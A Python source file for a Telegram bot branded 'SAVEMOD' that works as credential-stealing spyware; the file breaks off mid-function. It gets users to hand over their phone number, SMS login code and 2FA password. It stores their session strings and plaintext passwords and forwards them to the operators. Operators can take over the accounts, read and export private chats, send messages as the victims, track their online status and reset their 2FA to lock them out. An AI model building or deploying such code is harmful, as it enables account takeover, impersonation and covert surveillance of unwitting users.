import asyncio
import sqlite3
import os
import sys
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread
from typing import Optional, Dict, List, Any, Tuple

from flask import Flask, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import nest_asyncio

# ============================================================================
# НАСТРОЙКА
# ============================================================================

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("❌ Ошибка: Не заданы переменные окружения API_ID, API_HASH, BOT_TOKEN")
    sys.exit(1)

logger.info(f"👥 Администраторы: {ADMIN_IDS}")

# ============================================================================
# БАЗА ДАННЫХ
# ============================================================================

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

# Создание таблиц
cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string TEXT,
        phone TEXT,
        two_fa TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT
    )
''')

# Добавляем колонку если нет (фикс ошибки registered_at)
try:
    cursor.execute('ALTER TABLE user_sessions ADD COLUMN registered_at TEXT')
    conn.commit()
except:
    pass

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS spy_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        sender_id INTEGER,
        sender_name TEXT,
        message TEXT,
        chat_id INTEGER,
        chat_name TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_status_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        user_id INTEGER,
        user_name TEXT,
        status TEXT
    )
''')

conn.commit()
logger.info("✅ База данных готова")

# ============================================================================
# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
# ============================================================================

active_clients: Dict[int, TelegramClient] = {}
saved_messages: Dict[int, Dict[int, Dict]] = {}
temp_auth: Dict[int, Dict] = {}
active_chats: Dict[int, List[Dict]] = {}
user_status_tracker: Dict[int, Dict[int, str]] = {}
current_active_user: Optional[int] = None
monitored_users: Dict[str, Dict] = {}
pending_2fa: Dict[int, Dict] = {}

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)

# ============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================================

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_target_admin(target_id: int) -> bool:
    return target_id in ADMIN_IDS

def escape_html(text: str) -> str:
    return html.escape(str(text))

def get_status_text(status):
    if isinstance(status, UserStatusOnline):
        return "🟢 В сети"
    elif isinstance(status, UserStatusOffline):
        return "⚫ Не в сети"
    elif isinstance(status, UserStatusRecently):
        return "🟡 Был недавно"
    elif isinstance(status, UserStatusLastWeek):
        return "🟠 Был на неделе"
    elif isinstance(status, UserStatusLastMonth):
        return "🔴 Был в месяце"
    else:
        return "⚪ Статус скрыт"

def get_active_client() -> Tuple[Optional[TelegramClient], Optional[int]]:
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client, target: str):
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        if target.startswith('@'):
            return await client.get_entity(target)
        if target.lower() == 'me':
            return await client.get_me()
        return await client.get_entity(target)
    except:
        return None

async def send_to_admins(text: str):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode='HTML')
        except:
            pass

def get_code_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_digit_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_digit_0"),
        InlineKeyboardButton("⌫", callback_data="code_backspace"),
        InlineKeyboardButton("✅", callback_data="code_submit")
    )
    return kb

async def export_chat_to_html(client, chat_id, chat_name, me):
    messages = []
    async for msg in client.iter_messages(chat_id, limit=3000):
        if msg.text:
            try:
                if msg.out:
                    sender_name = f"{me.first_name} (Я)"
                    sender_class = "outgoing"
                else:
                    sender = await client.get_entity(msg.sender_id)
                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
                    sender_class = "incoming"
                timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
                text = escape_html(msg.text).replace('\n', '<br>')
                messages.append(f'<div class="message {sender_class}"><div class="msg-header"><span class="sender">{escape_html(sender_name)}</span><span class="date">{timestamp}</span></div><div class="msg-text">{text}</div></div>')
            except:
                continue
    if not messages:
        return None
    messages.reverse()
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Чат с {escape_html(chat_name)}</title>
<style>
body {{ font-family: system-ui; background: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
.container {{ max-width: 800px; margin: 0 auto; background: #17212b; border-radius: 16px; }}
.header {{ background: #1e2a3a; padding: 20px; border-bottom: 1px solid #2b3945; }}
.messages {{ padding: 20px; }}
.message {{ margin-bottom: 16px; padding: 10px 14px; border-radius: 14px; max-width: 85%; }}
.incoming {{ background: #2b3945; margin-right: auto; }}
.outgoing {{ background: #5288c1; margin-left: auto; text-align: right; }}
.msg-header {{ font-size: 12px; margin-bottom: 6px; display: flex; justify-content: space-between; }}
.sender {{ font-weight: bold; }}
.date {{ font-size: 10px; color: #6c7883; }}
.msg-text {{ font-size: 14px; white-space: pre-wrap; }}
.footer {{ background: #0e1621; padding: 12px; text-align: center; font-size: 12px; color: #6c7883; }}
</style>
</head>
<body>
<div class="container">
<div class="header"><h2>💬 Чат с {escape_html(chat_name)}</h2><div>Всего: {len(messages)}</div></div>
<div class="messages">{''.join(messages)}</div>
<div class="footer">📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</div>
</div>
</body>
</html>'''

# ============================================================================
# АДМИН КОМАНДЫ (БОТ)
# ============================================================================

@dp.message_handler(commands=['spyhelp'])
async def cmd_spyhelp(message):
    if not is_admin(message.from_user.id):
        return
    await message.answer("""
🕵️ <b>SAVEMOD - ВСЕ КОМАНДЫ</b>

<b>👥 УПРАВЛЕНИЕ</b>
/users - список аккаунтов
/sessions - список сессий
/swap НОМЕР - переключить аккаунт
/active - активный аккаунт
/del_session НОМЕР - удалить сессию
/show2fa НОМЕР - показать 2FA
/reset_me - сбросить свою сессию

<b>💬 ДЕЙСТВИЯ</b>
/send ID/@username текст
/chat ID/@username/tg
/chats - список диалогов
/status @username - статус
/online - кто в сети
/export ID - экспорт чата

<b>📊 МОНИТОРИНГ</b>
/mon @username - начать слежку
/unmon @username - остановить
/logs N - логи
/statuslogs N - логи статусов
/stats - статистика
/backup - бэкап БД

<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>
.help .mute .unmute .list .spam .type .info
""", parse_mode='HTML')

@dp.message_handler(commands=['users'])
async def cmd_users(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, last_name, username, phone, two_fa, is_active FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет аккаунтов")
        return
    response = "👥 <b>АККАУНТЫ</b>\n\n"
    idx = 0
    for uid, fname, lname, uname, phone, two_fa, is_active in rows:
        if is_target_admin(uid):
            continue
        idx += 1
        name = fname or uname or str(uid)
        active_mark = " ✅" if (is_active == 1 or uid == current_active_user) else ""
        response += f"<b>{idx}. {name}</b>{active_mark}\n   🆔 {uid}\n   📱 {phone or '-'}\n   🔐 {'✅' if two_fa else '❌'}\n\n"
        if len(response) > 3500:
            await message.answer(response[:4000], parse_mode='HTML')
            response = ""
    if response:
        await message.answer(response[:4000], parse_mode='HTML')

@dp.message_handler(commands=['sessions'])
async def cmd_sessions(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет сессий")
        return
    lst = []
    for uid, fname, uname in rows:
        if is_target_admin(uid):
            continue
        name = fname or uname or str(uid)
        status = "✅" if uid in active_clients else "❌"
        lst.append(f"{status} {uid} - {name}")
    await message.answer("📋 <b>СЕССИИ</b>\n\n" + "\n".join(lst), parse_mode='HTML')

@dp.message_handler(commands=['del_session'])
async def cmd_del_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /del_session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin = [(uid, fname, uname) for uid, fname, uname in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin):
            await message.answer("❌ Неверный номер")
            return
        target_id, fname, uname = non_admin[num]
        name = fname or uname or str(target_id)
        if target_id in active_clients:
            try:
                await active_clients[target_id].disconnect()
            except:
                pass
            del active_clients[target_id]
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (target_id,))
        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (target_id,))
        conn.commit()
        await message.answer(f"✅ Сессия {name} удалена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message):
    user_id = message.from_user.id
    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except:
            pass
        del active_clients[user_id]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (user_id,))
    conn.commit()
    await message.answer("✅ Сессия удалена. Отправь /start")

@dp.message_handler(commands=['show2fa'])
async def cmd_show2fa(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if args:
        try:
            num = int(args) - 1
            cursor.execute('SELECT user_id, first_name, username, two_fa FROM user_sessions')
            rows = cursor.fetchall()
            non_admin = [(uid, fname, uname, two_fa) for uid, fname, uname, two_fa in rows if not is_target_admin(uid)]
            if num < 0 or num >= len(non_admin):
                await message.answer("❌ Неверный номер")
                return
            uid, fname, uname, two_fa = non_admin[num]
            name = fname or uname or str(uid)
            if two_fa:
                await message.answer(f"🔐 2FA для {name}:\n<code>{two_fa}</code>", parse_mode='HTML')
            else:
                await message.answer(f"❌ У {name} нет 2FA")
        except:
            await message.answer("❌ Ошибка")
    else:
        client, uid = get_active_client()
        if not client or is_target_admin(uid):
            await message.answer("❌ Нет активного аккаунта")
            return
        cursor.execute('SELECT first_name, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if row and row[1]:
            await message.answer(f"🔐 2FA для {row[0]}:\n<code>{row[1]}</code>", parse_mode='HTML')
        else:
            await message.answer(f"❌ Нет 2FA")

@dp.message_handler(commands=['swap'])
async def cmd_swap(message):
    global current_active_user
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /swap НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin = [(uid, fname, uname) for uid, fname, uname in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin):
            await message.answer("❌ Неверный номер")
            return
        user_id, fname, uname = non_admin[num]
        name = fname or uname or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт {name} не запущен")
            return
        current_active_user = user_id
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
        conn.commit()
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на {me.first_name}")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['active'])
async def cmd_active(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        me = await client.get_me()
        await message.answer(f"✅ Активный: {me.first_name} (@{me.username or 'нет'})")
    except:
        await message.answer(f"✅ Активный ID: {uid}")

@dp.message_handler(commands=['send'])
async def cmd_send(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /send @username текст")
        return
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ /send @username текст")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, parts[0])
    if not entity or is_target_admin(entity.id):
        await message.answer("❌ Пользователь не найден или админ")
        return
    try:
        await client.send_message(entity.id, parts[1])
        await message.answer(f"✅ Отправлено: {parts[1][:100]}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ===== /chat - РАБОТАЕТ СРАЗУ БЕЗ /chats =====
@dp.message_handler(commands=['chat'])
async def cmd_chat(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /chat ID\n/chat @username\n/chat tg")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        if args.lower() in ['tg', '777000', 'telegram']:
            chat_id = 777000
            chat_name = "Telegram (коды)"
        else:
            entity = await resolve_entity(client, args)
            if not entity or is_target_admin(entity.id):
                await message.answer("❌ Пользователь не найден")
                return
            chat_id = entity.id
            chat_name = entity.first_name or entity.username or args
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("📝 Последние 30", callback_data=f"chat_last_{chat_id}_{chat_name}"),
            InlineKeyboardButton("📄 Полный HTML", callback_data=f"chat_full_{chat_id}_{chat_name}")
        )
        await message.answer(f"📱 Чат с {chat_name}", reply_markup=kb)
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['chats'])
async def cmd_chats(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    await message.answer("🔄 Собираю список...")
    chats = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if getattr(entity, 'bot', False) or entity.id == uid or is_target_admin(entity.id):
                    continue
                name = entity.first_name or entity.username or str(entity.id)
                chats.append({'id': entity.id, 'name': name})
            except:
                chats.append({'id': dialog.id, 'name': dialog.name or str(dialog.id)})
    active_chats[uid] = chats
    if not chats:
        await message.answer("📭 Нет диалогов")
        return
    response = "📋 ДИАЛОГИ\n\n"
    for i, chat in enumerate(chats):
        response += f"{i+1}. {chat['name']}\n"
        if len(response) > 3500:
            await message.answer(response)
            response = ""
    if response:
        await message.answer(response)

@dp.callback_query_handler(lambda c: c.data.startswith('chat_last_'))
async def chat_last_callback(callback):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав")
        return
    data = callback.data.replace('chat_last_', '').split('_', 1)
    chat_id = int(data[0])
    chat_name = data[1]
    client, uid = get_active_client()
    if not client:
        await callback.message.answer("❌ Нет активного аккаунта")
        return
    msgs = []
    async for msg in client.iter_messages(chat_id, limit=30):
        if msg.text:
            try:
                if msg.out:
                    sender = "👉 Я"
                else:
                    s = await client.get_entity(msg.sender_id)
                    if is_target_admin(s.id):
                        continue
                    sender = s.first_name or s.username or str(s.id)
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sender}: {msg.text[:150]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
    if msgs:
        await callback.message.answer(f"💬 ЧАТ С {chat_name}\n\n" + "\n".join(reversed(msgs[-25:])))
    else:
        await callback.message.answer("📭 Нет сообщений")

@dp.callback_query_handler(lambda c: c.data.startswith('chat_full_'))
async def chat_full_callback(callback):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Нет прав")
        return
    data = callback.data.replace('chat_full_', '').split('_', 1)
    chat_id = int(data[0])
    chat_name = data[1]
    client, uid = get_active_client()
    if not client:
        await callback.message.answer("❌ Нет активного аккаунта")
        return
    try:
        me = await client.get_me()
        status_msg = await callback.message.answer("🔄 Экспортирую...")
        html_content = await export_chat_to_html(client, chat_id, chat_name, me)
        if not html_content:
            await status_msg.edit_text("❌ Нет сообщений")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            temp_path = f.name
        with open(temp_path, 'rb') as f:
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}.html"), caption=f"📁 Чат с {chat_name}")
                    await f.seek(0)
                except:
                    pass
        os.unlink(temp_path)
        await status_msg.delete()
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['export'])
async def cmd_export(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /export ID")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity or is_target_admin(entity.id):
        await message.answer("❌ Пользователь не найден")
        return
    chat_name = entity.first_name or entity.username or str(entity.id)
    status_msg = await message.answer(f"🔄 Экспортирую чат с {chat_name}...")
    try:
        me = await client.get_me()
        html_content = await export_chat_to_html(client, entity.id, chat_name, me)
        if not html_content:
            await status_msg.edit_text("❌ Нет сообщений")
            return
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            temp_path = f.name
        with open(temp_path, 'rb') as f:
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}.html"), caption=f"📁 Чат с {chat_name}")
                    await f.seek(0)
                except:
                    pass
        os.unlink(temp_path)
        await status_msg.delete()
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /status @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity or getattr(entity, 'bot', False) or is_target_admin(entity.id):
        await message.answer("❌ Не найден или админ")
        return
    status_text = get_status_text(entity.status) if hasattr(entity, 'status') else "Статус скрыт"
    await message.answer(f"👤 {entity.first_name}\n🆔 {entity.id}\n📊 {status_text}")

@dp.message_handler(commands=['online'])
async def cmd_online(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    online = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if not getattr(entity, 'bot', False) and not is_target_admin(entity.id) and isinstance(entity.status, UserStatusOnline):
                    online.append(dialog.name)
            except:
                pass
    if online:
        await message.answer(f"🟢 В сети ({len(online)}):\n" + "\n".join(online[:30]))
    else:
        await message.answer("🟢 Никого")

@dp.message_handler(commands=['mon'])
async def cmd_mon(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /mon @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity or getattr(entity, 'bot', False) or is_target_admin(entity.id):
        await message.answer("❌ Не найден или админ")
        return
    monitored_users[str(entity.id)] = {'name': entity.first_name, 'admin_id': message.from_user.id}
    await message.answer(f"✅ Мониторинг {entity.first_name} начат")

@dp.message_handler(commands=['unmon'])
async def cmd_unmon(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /unmon @username")
        return
    client, uid = get_active_client()
    if not client:
        await message.answer("❌ Нет активного аккаунта")
        return
    entity = await resolve_entity(client, args)
    if not entity:
        await message.answer("❌ Не найден")
        return
    if str(entity.id) in monitored_users:
        del monitored_users[str(entity.id)]
        await message.answer(f"✅ Мониторинг {entity.first_name} остановлен")
    else:
        await message.answer("❌ Не отслеживается")

@dp.message_handler(commands=['session'])
async def cmd_session(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /session НОМЕР")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        non_admin = [(uid, ss, phone, two_fa, fname, uname) for uid, ss, phone, two_fa, fname, uname in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(non_admin):
            await message.answer("❌ Неверный номер")
            return
        uid, ss, phone, two_fa, fname, uname = non_admin[num]
        name = fname or uname or str(uid)
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, f"🎭 СЕССИЯ {name}\n\n<code>{ss}</code>", parse_mode='HTML')
            except:
                pass
        await message.answer("✅ Сессия отправлена")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['set2fa'])
async def cmd_set2fa(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    if not args:
        await message.answer("❌ /set2fa ПАРОЛЬ")
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        await client.edit_2fa(args)
        cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
        conn.commit()
        await message.answer(f"✅ 2FA установлен: <code>{args}</code>", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['info'])
async def cmd_info(message):
    if not is_admin(message.from_user.id):
        return
    client, uid = get_active_client()
    if not client or is_target_admin(uid):
        await message.answer("❌ Нет активного аккаунта")
        return
    try:
        me = await client.get_me()
        cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        await message.answer(f"👤 {me.first_name}\n🆔 {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
    except:
        await message.answer("❌ Ошибка")

@dp.message_handler(commands=['logs'])
async def cmd_logs(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов")
        return
    response = "📜 ЛОГИ\n\n"
    for ts, name, msg in reversed(rows):
        response += f"[{ts[11:16]}] {name}: {msg[:80]}\n"
    await message.answer(response[:4000])

@dp.message_handler(commands=['statuslogs'])
async def cmd_statuslogs(message):
    if not is_admin(message.from_user.id):
        return
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    if not rows:
        await message.answer("📭 Нет логов")
        return
    response = "🔄 ЛОГИ СТАТУСОВ\n\n"
    for ts, name, status in reversed(rows):
        emoji = "🟢" if "ВОШЕЛ" in status else "⚫"
        response += f"{emoji} [{ts[11:16]}] {name}: {status}\n"
    await message.answer(response[:4000])

@dp.message_handler(commands=['stats'])
async def cmd_stats(message):
    if not is_admin(message.from_user.id):
        return
    cursor.execute('SELECT COUNT(*) FROM spy_logs')
    logs = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_sessions')
    accounts = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
    status_logs = cursor.fetchone()[0]
    await message.answer(f"📊 СТАТИСТИКА\n\nАккаунтов: {accounts}\nСообщений: {logs}\nЛогов статусов: {status_logs}\nАктивных: {len(active_clients)}")

@dp.message_handler(commands=['backup'])
async def cmd_backup(message):
    if not is_admin(message.from_user.id):
        return
    status_msg = await message.answer("💾 Создаю бэкап...")
    backup_path = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, backup_path)
    with open(backup_path, 'rb') as f:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(admin_id, InputFile(f, filename=os.path.basename(backup_path)), caption=f"💾 Бэкап")
                await f.seek(0)
            except:
                pass
    os.remove(backup_path)
    await status_msg.edit_text("✅ Бэкап отправлен")

# ============================================================================
# РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЕЙ
# ============================================================================

@dp.message_handler(commands=['start'])
async def cmd_start(message):
    user_id = message.from_user.id
    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {'client': client, 'phone': phone, 'hash': result.phone_code_hash, 'code': ''}
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code(callback):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("Сессия истекла, /start")
        return
    action = callback.data.replace('code_', '')
    current = temp_auth[user_id].get('code', '')
    if action.startswith('digit_'):
        digit = action.split('_')[1]
        if len(current) < 5:
            temp_auth[user_id]['code'] = current + digit
    elif action == 'backspace':
        temp_auth[user_id]['code'] = current[:-1]
    elif action == 'submit':
        if len(current) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр", show_alert=True)
            return
    code = temp_auth[user_id]['code']
    display = code if code else "_____"
    await callback.message.edit_text(f"📱 Код: {display}", reply_markup=get_code_keyboard())
    await callback.answer()

async def complete_auth(callback, user_id):
    data = temp_auth[user_id]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        session_str = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (user_id, session_str, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await callback.message.answer(f"✅ Авторизация успешна!\n/spyhelp - команды")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data['client'].disconnect()
        del temp_auth[user_id]
        await send_to_admins(f"🎉 Новый пользователь: {me.first_name}\nID: {user_id}")
    except Exception as e:
        if '2FA' in str(e):
            await callback.message.answer("🔐 Введи пароль от 2FA:")
            pending_2fa[user_id] = data
            del temp_auth[user_id]
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message):
    user_id = message.from_user.id
    data = pending_2fa[user_id]
    try:
        await data['client'].sign_in(password=message.text.strip())
        session_str = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (user_id, session_str, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer(f"✅ Авторизация успешна!\n/spyhelp - команды")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data['client'].disconnect()
        del pending_2fa[user_id]
        await send_to_admins(f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {user_id}\n2FA: {message.text.strip()}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ============================================================================
# ЮЗЕРБОТ
# ============================================================================

async def run_userbot(owner_id, session_string):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
